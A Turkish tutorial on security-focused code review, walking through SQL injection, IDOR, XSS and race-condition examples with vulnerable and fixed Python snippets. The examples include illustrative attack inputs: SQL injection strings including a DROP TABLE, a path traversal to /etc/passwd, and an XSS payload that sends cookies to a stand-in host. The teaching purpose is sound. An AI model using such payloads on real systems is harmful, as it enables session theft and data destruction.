# Güvenlik Odaklı Kod İnceleme

## 1. Problem ve bağlam: bu iş neyi çözer, ne zaman devreye girer

Güvenlik odaklı kod inceleme, "kod çalışıyor mu" sorusundan farklı bir soruyu sorar: "Bu kod, benim niyet etmediğim şeyleri yapmaya *zorlanabilir* mi?" Sıradan bir code review'da hedef doğruluk, okunabilirlik ve bakım kolaylığıdır. Güvenlik incelemesinde ise düşman bir aktör varsayarsın. Kullanıcının gireceği veriyi "kullanıcı iyi niyetli" diye değil, "bu alana dünyanın en kötü niyetli 4 KB'ını yapıştıracak biri var" diye okursun.

Bu iş üç yerde devreye girer. Birincisi, dışarıya açık bir yüzey eklendiğinde: yeni bir endpoint, yeni bir dosya yükleme, yeni bir arama kutusu, yeni bir webhook alıcısı. İkincisi, güven sınırının (trust boundary) değiştiği yerde: veri bir yerden başka bir yere, farklı bir yetki bağlamına geçtiğinde. Üçüncüsü, kritik varlıklara dokunan her değişiklikte: kimlik doğrulama, yetkilendirme, para, kişisel veri, kriptografi, ödeme.

Acemi geliştiricinin en büyük yanılgısı güvenliği "sonda yapılacak bir tarama işi" sanmasıdır. Güvenlik, tıpkı test edilebilirlik gibi, tasarımın bir özelliğidir; sonradan üstüne sürülen bir cila değildir. 15 yılda öğrendiğim en pahalı ders şu: Bir zafiyet üretime çıktıktan sonra düzeltmenin maliyeti, review'da yakalamanın maliyetinin yüzlerce katıdır. Çünkü artık sadece kodu değil, sızmış veriyi, itibar kaybını, uyumluluk (compliance) sonuçlarını ve müşteri güvenini de yönetiyorsundur.

Güvenlik incelemesinin gerçek değeri "otomatik araç kırmızı yaktı" değildir. Statik analiz araçları imza tanır; asıl zafiyetler **iş mantığında** ve **güven sınırlarında** saklanır ve orada hiçbir SAST aracı seni kurtarmaz. Değer, insanın yargısındadır: "Bu akış kime ne yaptırabilir?"

## 2. Metodoloji ve karar ağacı: pro nasıl ilerler

### Önce zihinsel çerçeve: veri akışını takip et, satır okuma

Acemi kodu yukarıdan aşağı satır satır okur ve "şurada bir hata var mı" diye bakar. Pro böyle yapmaz. Pro **veriyi takip eder**. Sorduğu tek temel soru: *"Güvenilmeyen veri (untrusted input) nereden giriyor, hangi yollardan geçiyor, nerelerde tehlikeli bir işleme (sink) varıyor?"*

Kaynak (source) → akış → varış (sink). Bu üçlüyü kafanda çizersin:

- **Kaynak:** HTTP parametreleri, header'lar, cookie'ler, dosya içerikleri, dış API cevapları, mesaj kuyruğu payload'ları, veritabanından gelen ama daha önce kullanıcı tarafından yazılmış alanlar (ikinci mertebe / second-order zafiyetler burada saklanır).
- **Sink:** SQL sorgusu, shell komutu, dosya yolu, HTML çıktısı, deserialization, HTTP isteği (SSRF), LDAP sorgusu, template motoru, yansıma (reflection) ile çağrılan metot.

Bir kaynağı bir sink'e temizlenmeden bağlanan her yol bir adaydır.

### Adım adım karar ağacı

**Adım 1 — Değişikliğin sınırını çiz.** İlk yaptığım şey diff'in kapsamını anlamak: Hangi güven sınırlarına dokunuyor? Eğer değişiklik tamamen içeride, hiç kullanıcı verisi görmeyen bir hesaplama ise güvenlik yükü düşüktür, hızlı geçerim. Eğer bir input parse ediyor, bir yetki kontrolüne dokunuyor ya da bir dış sisteme istek atıyorsa, alarm seviyesi yükselir ve yavaşlarım.

**Adım 2 — Kimlik doğrulama ve yetkilendirmeyi ayır ve ayrı ayrı sorgula.** Bu ikisini karıştırmak en yaygın felakettir.
- *Authentication (sen kimsin):* Bu endpoint gerçekten kimlik doğrulaması istiyor mu? Token doğrulaması nerede yapılıyor?
- *Authorization (sen bunu yapabilir misin):* Kullanıcı kimliği doğrulandı, peki *bu belirli kaydı* görme/değiştirme hakkı var mı? Burada aradığım şey **IDOR** (Insecure Direct Object Reference): `GET /api/invoices/1043` isteğinde, 1043 numaralı faturanın *isteği yapan kullanıcıya ait olduğu* kontrol ediliyor mu, yoksa sadece "giriş yapmış mı" mı kontrol ediliyor? Bunu her nesne erişiminde sorarım. Kod `findById(id)` diyorsa ve arkasında `AND owner_id = current_user` yoksa, kalemi çıkarırım.

**Adım 3 — Her input'ta "bu neye dönüşecek" diye sor.** Belirti-yön eşleştirmesi kafamda hazırdır:
- Girdi bir **SQL sorgusuna** mı gidiyor? → Parametreli sorgu (prepared statement) var mı, yoksa string birleştirme mi? String birleştirme görürsem SQL injection alarmı.
- Girdi bir **HTML sayfasına** basılıyor mu? → Çıktı encode ediliyor mu (context-aware escaping)? XSS.
- Girdi bir **komut satırına / shell'e** mi gidiyor? → Command injection. `os.system`, `exec`, backtick, `Runtime.exec` gördüğüm anda durur, argümanların nasıl geçtiğine bakarım.
- Girdi bir **dosya yoluna** mı çevriliyor? → Path traversal (`../../etc/passwd`). Kullanıcı dosya adı veriyorsa, canonicalize edilip beklenen kök dizinin altında mı diye kontrol ediliyor mu?
- Girdi bir **URL'e** mi çevrilip sunucu tarafından istek atılıyor? → SSRF. İç ağa, `169.254.169.254` metadata servisine erişebilir mi?
- Girdi **deserialize** mi ediliyor? → Güvensiz deserialization, en tehlikelilerinden.

**Adım 4 — Kripto ve sırlar (secrets).** Şunları ararım: hard-coded API anahtarı, parola, token; kendi yazılmış şifreleme; MD5/SHA1 ile parola saklama; `Math.random()` ile token/oturum üretme; sabit IV; TLS doğrulamasının kapatılması (`verify=False`). Kendi kripto algoritmasını yazan bir PR görürsem varsayılan cevabım "hayır"dır — bunun neredeyse hiç istisnası yok.

**Adım 5 — Hata yolları ve fail-open/fail-closed.** Asıl zafiyetler mutlu yolda (happy path) değil, hata yollarında saklanır. "Yetki kontrolü bir exception fırlatırsa ne olur — kullanıcı içeri girer mi (fail-open) yoksa dışarıda mı kalır (fail-closed)?" Bir `try/catch` bloğunun `catch`'inde erişimin sessizce verildiğini görmek klasik bir bulgudur.

**Adım 6 — Takaslar.** Her bulgu "kalemi çıkar" demek değildir. Pro, riskin sömürülebilirliğini ve etkisini tartar. İç ağda, sadece yöneticilerin eriştiği, düşük etkili bir alandaki teorik bir sorunla; internete açık, kimlik doğrulamasız bir endpoint'teki SQL injection aynı aciliyette değildir. Ben bulguları "üretimi durdurur (blocker)", "bu sürümde düzeltilmeli", "borç olarak yaz (backlog)" diye ayırırım. Her şeyi blocker yapan güvenlik incelemecisine takım bir süre sonra kulaklarını kapatır; bu da güvenliğin en büyük sessiz düşmanıdır.

### En temel prensip: güvenmediğin veriye asla güvenme, ama nerede güvendiğini bil

Kilit soru şudur: "Bu veri hangi noktadan sonra *temiz* kabul ediliyor?" Eğer temizleme (validation/sanitization) girişte bir kez yapılıp sonra her yerde temiz varsayılıyorsa ve arada temiz olmayan bir yol veriyi enjekte edebiliyorsa, işte orada bir açık var. Pro, "validation input'ta, encoding output'ta" der. İkisi farklı işlerdir; acemiler bunu karıştırır.

## 3. Gerçek kod üzerinden yürüyüş: zafiyetli → teşhis → düzeltilmiş

Somut bir senaryo alalım. Bir e-ticaret uygulamasında kullanıcının kendi siparişlerini görüntülediği bir endpoint. Aşağıdaki kod Python/Flask benzeri bir sözde-kodla, ama mantık dile bağımsız.

### Zafiyetli hâli

```python
@app.route("/api/orders/<order_id>")
def get_order(order_id):
    user = get_current_user()  # oturumdan kullanıcı
    query = "SELECT * FROM orders WHERE id = " + order_id
    order = db.execute(query).fetchone()
    return jsonify(order)
```

Bu dört satırda **iki** ayrı ciddi zafiyet var. Pro bunu 10 saniyede görür.

**Teşhis 1 — SQL Injection.** `order_id` doğrudan string birleştirmeyle sorguya giriyor. Saldırgan `/api/orders/0 OR 1=1` gönderirse bütün siparişler döner. `/api/orders/0; DROP TABLE orders--` ya da bir UNION saldırısıyla `users` tablosundan parola hash'lerini çekebilir. Belirti neydi? *String + kullanıcı verisi → SQL sink.* Bu deseni gördüğüm an başka hiçbir şeye bakmadan işaretlerim.

**Teşhis 2 — IDOR / eksik yetkilendirme.** Diyelim SQL injection'ı düzelttik. Kod hâlâ kırık, çünkü `get_current_user()` çağrılıyor ama sonuç **hiçbir yerde kullanılmıyor**. Sorgu sadece `WHERE id = ?` diyor, `AND user_id = ?` demiyor. Yani giriş yapmış herhangi bir kullanıcı, `order_id`'yi 1'den başlayıp artırarak *başkalarının* siparişlerini, adreslerini, telefon numaralarını okuyabilir. Bu, otomatik araçların çoğunun *asla* yakalayamadığı türden bir hatadır, çünkü kod sözdizimsel olarak kusursuzdur; sadece iş mantığı yanlıştır. Belirti neydi? *Nesneye erişim var, ama nesnenin sahipliği doğrulanmıyor.*

### Düzeltilmiş hâli

```python
@app.route("/api/orders/<order_id>")
def get_order(order_id):
    user = get_current_user()
    if user is None:
        abort(401)  # fail-closed: kimlik yoksa içeri alma

    # Parametreli sorgu: order_id artık veri, kod değil
    query = "SELECT * FROM orders WHERE id = ? AND user_id = ?"
    order = db.execute(query, (order_id, user.id)).fetchone()

    if order is None:
        # Dikkat: "yok" ile "senin değil"i AYNI cevapla döndür
        abort(404)

    return jsonify(order)
```

Burada üç ayrı iyileştirme var, ve üçüncüsü inceliklidir:

1. **Parametreli sorgu** SQL injection'ı kökten çözer. Sürücü, `order_id`'yi asla kod olarak değil, saf veri olarak işler. `?` işaretini string ile birleştirip "parametreli gibi" yapan sahte çözümlere dikkat — o hâlâ enjeksiyondur.

2. **`AND user_id = ?`** ile yetkilendirme sorgunun içine gömüldü. Bunu koddan önce `if order.user_id != user.id` diye *sonradan* kontrol etmek de olur ama tercih ettiğim yol yetkilendirmeyi sorguya taşımaktır; unutulması daha zordur.

3. **Bilgi sızıntısı önlemi:** "Kayıt yok" (404) ile "kayıt var ama senin değil" (403) durumunu *aynı* 404 ile döndürüyorum. Eğer birine 403, diğerine 404 dönseydim, saldırgan hangi sipariş numaralarının *var olduğunu* çıkarabilirdi (enumeration). Bu, acemilerin "daha yardımcı hata mesajı" diye ekleyip farkında olmadan açtığı bir yan kanaldır.

### Ara not: teşhis sırasının önemi

Dikkat et, yukarıdaki örnekte önce SQL injection'ı, sonra IDOR'u buldum ama düzeltirken *ikisini birden* ele aldım. Acemi çoğu zaman ilk gördüğü zafiyeti düzeltip "tamam oldu" der ve ikinciyi kaçırır. Pro, bir satırda bir problem bulduğunda o satırı terk etmez; "burada bir kusur varsa, aynı zihniyetle yazılmış başka kusur da vardır" diye çevresini tarar. Zafiyetler sürü hâlinde gezer; bir tanesini gören, yakınında kardeşlerini de arar. Bir dosyada `WHERE id = ` diye string birleştirme gördüysem, o kod tabanındaki *tüm* benzer sorguları gözden geçirmem gerektiğini bilirim — çünkü aynı kalıbı kopyalayıp yapıştıran birileri neredeyse kesin olarak vardır.

### İkinci senaryo: XSS ve encoding bağlamı

```python
# Zafiyetli: kullanıcı adı doğrudan HTML'e basılıyor
return f"<div>Hoş geldin, {username}</div>"
```

`username` değeri `<script>fetch('//kotu.site/c?'+document.cookie)</script>` ise, oturum çerezi saldırgana gider. Teşhis: *kullanıcı verisi → HTML sink, encode yok.*

Düzeltme, "girişte `<` işaretini yasakla" değildir — bu kırılgandır ve meşru veriyi bozar. Doğru düzeltme **çıktı bağlamına göre encode**dir: HTML gövdesine basıyorsan HTML-encode, bir HTML attribute içine basıyorsan attribute-encode, JavaScript bağlamına basıyorsan JS-encode. Modern template motorları (Jinja2, React JSX) bunu otomatik yapar; asıl tehlike birinin `| safe`, `dangerouslySetInnerHTML` ya da string birleştirmeyle bu korumayı **devre dışı bıraktığı** yerdedir. Review'da ben tam olarak bu "kaçış kapılarını" ararım.

### Üçüncü senaryo: yarış durumu (TOCTOU) ve iş mantığı

Bir para çekme fonksiyonu düşün:

```python
def withdraw(user_id, amount):
    balance = db.get_balance(user_id)      # kontrol (check)
    if balance >= amount:
        db.set_balance(user_id, balance - amount)  # kullanım (use)
        send_money(user_id, amount)
```

Fonksiyonel test kusursuz geçer. Ama iki istek *aynı anda* gelirse — kullanıcı aynı anda iki sekmeden "çek" derse — her ikisi de `balance` değerini eski hâliyle okur, ikisi de kontrolü geçer, ve kullanıcı bakiyesinin iki katını çeker. Buna TOCTOU (Time-Of-Check to Time-Of-Use) yarış durumu denir. Teşhis: *kontrol ile kullanım arasında atomiklik yok.* Bu, güvenlik incelemesinin en zor tarafıdır çünkü kod tek başına okunduğunda mantıklı görünür; kusur ancak "iki kopyası aynı anda çalışırsa ne olur?" diye sorunca ortaya çıkar. Düzeltme, kontrolü ve düşümü tek bir atomik işleme almaktır: veritabanında `UPDATE accounts SET balance = balance - ? WHERE user_id = ? AND balance >= ?` gibi koşullu, tek-adımlı bir güncelleme ve etkilenen satır sayısını kontrol etmek. Kilitleme (SELECT ... FOR UPDATE) ya da idempotency anahtarı da araçlardandır. Bu tür bulgular gerçek parayı gerçek zarara çevirir; bir fintech incelemesinde ilk baktığım şeylerden biridir.

## 4. Acemi vs pro: tuzaklar ve gözden kaçanlar

**Acemi giriş doğrulamasına (input validation) güvenir, pro çıktı kodlamasına (output encoding) güvenir.** Acemi "kötü karakterleri filtreleyeyim" (blacklist) der. Pro bilir ki blacklist her zaman eksiktir — saldırgan senin düşünmediğin bir kodlama, bir Unicode normalizasyonu, bir çift-kodlama (double encoding) bulur. Doğru yaklaşım: girişte *beklenen formatı* doğrula (whitelist: "bu alan tam olarak 6 haneli rakam olmalı"), tehlikeyi ise *çıkışta, bağlama göre* etkisiz hâle getir.

**"Çalışıyor" ile "güvenli" bambaşka şeylerdir.** Zafiyetli kodun testleri yeşil yanar, demo kusursuz gider, mutlu yol çalışır. Güvenlik açığı mutlu yolda değil, kimsenin denemediği kenar durumdadır. Bu yüzden "test geçiyor" bir güvenlik argümanı değildir.

**Kendi kriptonu / kendi auth'unu yazma tuzağı.** Acemi "basit bir token üreteyim" der ve `Math.random()` ya da `timestamp + username`'i base64'ler. Bunlar tahmin edilebilir. Kriptografik olarak güvenli rastgelelik (CSPRNG) ve olgunlaşmış kütüphaneler kullanılmalı. Bir PR'da "kendi JWT doğrulamamı yazdım" görürsem alarm çanları çalar; imza doğrulamasının atlanabildiği (`alg: none`, imza karşılaştırmasının sabit-zamanlı olmaması) o kadar çok yol var ki.

**Timing / yan kanal körlüğü.** Acemi parolayı `if stored == provided` ile karşılaştırır. Bu, string'lerin ilk farklı karaktere kadar karşılaştırılması nedeniyle zamanlama sızdırır. Pro sabit-zamanlı karşılaştırma (constant-time compare) kullanır. Küçük görünür, gerçek saldırılarda sömürülmüştür.

**"Bu iç servis, güvenli" yanılgısı.** Acemi iç ağdaki servislerin arasında güvene gerek olmadığını sanır. Modern gerçek: ağ sınırları delinir, tek bir SSRF ya da ele geçirilmiş bir konteyner, bütün "iç" güveni saldırgana açar. Sıfır güven (zero trust) zihniyeti: her sınırda kimlik doğrula.

**Log'a sır yazma.** "Debug için isteği loglayayım" diyip Authorization header'ını, parolayı, kredi kartını düz metin log'a basmak çok yaygındır. Log'lar genelde daha az korunur, uzun süre saklanır ve üçüncü partilere (log toplama servisleri) akar. Review'da log satırlarına özellikle bakarım.

**İkinci mertebe (second-order) zafiyetler.** Acemi sadece HTTP isteğinden gelen veriye "kirli" der. Pro bilir ki veritabanından okunan bir alan da, eğer daha önce bir kullanıcı tarafından yazılmışsa, aynı ölçüde kirlidir. Klasik örnek: kayıt sırasında zararsızca saklanan bir "kullanıcı adı", daha sonra bir admin panelinde encode edilmeden basılınca patlar (stored XSS).

**Mass assignment / aşırı bağlama.** `user.update(request.body)` gibi tüm gövdeyi nesneye bağlayan kod, saldırganın `{"is_admin": true}` göndererek yetki yükseltmesine izin verir. Pro, güncellenebilecek alanları açıkça beyaz listeler.

**Bağımlılık körlüğü.** Kendi kodun kusursuz olsa bile, çektiğin üçüncü parti paketlerdeki bilinen zafiyetler (CVE'ler) senin de zafiyetindir. Acemi sadece kendi yazdığına bakar; pro bağımlılık ağacını da kapsam içinde tutar.

**"İşe yarar gibi görünüp üretimde patlayan" en sinsi tuzak: rate limiting yokluğu.** Login endpoint'i mükemmel çalışır — ta ki biri saniyede binlerce parola denesin (credential stuffing / brute force). Fonksiyonel test bunu asla göstermez; üretimde hesaplar ele geçirilir.

## 5. Araçlar ve saha notları

Araçlar seni *hızlandırır* ama *yargının yerini almaz*. İş bölümü şöyle:

**SAST (statik analiz) — Semgrep, CodeQL, Bandit (Python), gosec (Go), Brakeman (Ruby/Rails).** Bunlar kaynak kodda desen tarar. Güçlü yanları: string-birleştirmeli SQL, hard-coded secret, bilinen tehlikeli fonksiyon çağrıları gibi *imzalanabilir* şeyleri ölçekli yakalar. Semgrep özellikle değerli, çünkü kendi kurallarını yazabilirsin — "bizim kod tabanında `db.raw()` çağrısı görürsen uyar" gibi organizasyona özel kurallar en yüksek getiriyi verir. Zayıf yanları: iş mantığı hatalarını (IDOR, yetki eksikliği) *göremezler* ve çok gürültü (false positive) üretirler. Pro tüyosu: SAST çıktısını körü körüne bilet açmak için değil, "nereye bakmalıyım" haritası olarak kullan.

**Secret tarama — gitleaks, trufflehog.** Commit geçmişinde ve diff'te sızmış anahtar/token arar. Bunu CI'ya pre-commit hook olarak koymak, sırların git geçmişine gömülmesini (ki oradan silmek kabustur) en baştan engeller.

**SCA (bağımlılık taraması) — Dependabot, Snyk, OWASP Dependency-Check, `npm audit`, `pip-audit`.** Kullandığın paketlerdeki bilinen CVE'leri bildirir. Otomatik PR açan Dependabot'u açık tutmak, düşük eforla yüksek getiri sağlar. Uyarı: her uyarı acil değildir; sömürülebilir yolda olan bağımlılığa öncelik ver.

**DAST ve fuzzing — çalışan uygulamayı dışarıdan döver.** Burp Suite (yarı-manuel, güvenlik mühendisinin İsviçre çakısı), OWASP ZAP (açık kaynak). Fuzzing, endpoint'e binlerce bozuk/uç girdi fırlatıp çökme veya beklenmedik davranış arar. Statik analizin göremediği runtime hatalarını bulur.

**Manuel inceleme — hâlâ en değerlisi.** IDOR, iş mantığı, yetki modelindeki kusurlar, yarış durumları (TOCTOU) neredeyse yalnızca insan gözüyle bulunur. Benim manuel akışım: diff'i aç, güven sınırlarını işaretle, her input için source→sink yolunu izle, her nesne erişiminde sahiplik sorgula, hata yollarını fail-open/fail-closed diye oku.

### Saha notları (yıllar içinde biriken)

- **Threat model'i kafanda hep açık tut:** STRIDE (Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege) her bileşene karşı hızlı bir kontrol listesidir. "Bu bileşene karşı bu altı şeyden hangisi mümkün?" diye geç.
- **Diff büyükse riski artır, küçültmeyi iste.** 2000 satırlık bir güvenlik-hassas PR düzgün incelenemez; insan dikkati o ölçekte çöker. Küçük, atomik PR güvenliğin de dostudur.
- **"Neden" yerine "nasıl kötüye kullanılır" diye sor.** Kodun ne yaptığını değil, ne yaptırılabileceğini modelle. Bu zihinsel kayma, güvenlik incelemecisini normal incelemeciden ayıran şeydir.
- **Yorumların tonu önemlidir.** Güvenlik bulgusunu yazarken "sen kötü kod yazmışsın" değil, "şu girdiyle şu senaryoda şu olur" diye somut sömürü senaryosuyla yaz. Somut senaryo hem ikna eder hem de düzelticinin doğru düzeltmeyi bulmasını sağlar. Soyut "bu güvensiz" yorumu genelde yanlış düzeltmeyle sonuçlanır.
- **Varsayılanlar (defaults) güvenli olsun.** Bir konfigürasyon eklerken "unutulursa ne olur" diye sor. Unutulduğunda sistemin *kapalı/güvenli* konuma düşmesi (secure by default) gerekir. TLS doğrulaması varsayılan açık, debug modu varsayılan kapalı, yeni kaynak varsayılan özel olmalı.
- **Compliance güvenlik değildir, ama iz bırakır.** PCI, GDPR, KVKK gibi çerçeveler asgari çıtayı zorlar; onları geçmek "güvenli" olmak demek değildir ama kişisel veri/ödeme dokunan kodda bu gereklilikleri de kontrol listende tut.
- **Otomatik + manuel katmanlı savunma:** CI'da secret tarama + SAST + SCA zorunlu geçit; sonra kritik yüzeylerde insan incelemesi. Tek katman yeter demek, en yaygın örgütsel hatadır.
- **Log ve gözlemlenebilirlik, saldırıyı fark etmenin ön koşuludur.** Yetki reddi, başarısız login, anormal hata oranları loglanmalı ve izlenmeli — ama loglar içine sır sızdırmadan. Bir saldırıyı üç ay sonra müşteri şikayetiyle öğrenmek ile aynı gün alarmla öğrenmek arasındaki fark, gözlemlenebilirliktir.

### Kapanış: incelemecinin zihniyeti

Güvenlik odaklı kod incelemesinde en değerli varlık bir araç ya da kontrol listesi değil, **kalıcı bir şüphedir**: "Bu veri güvenilmez, bu sınır delinebilir, bu hata yolu sömürülebilir, bu yetki atlanabilir." Kontrol listeleri seni başlatır ama işi bitiren şey, kodu bir saldırganın gözünden okuyabilme alışkanlığıdır. Bu alışkanlık, yüzlerce gerçek bulgu ve birkaç acı üretim olayıyla kazanılır — ve bir kez kazanıldığında, artık her diff'e o gözle bakarsın. En iyi güvenlik incelemecisi, kodun ne yapması gerektiğini değil, ne yapmaya *zorlanabileceğini* gören kişidir.
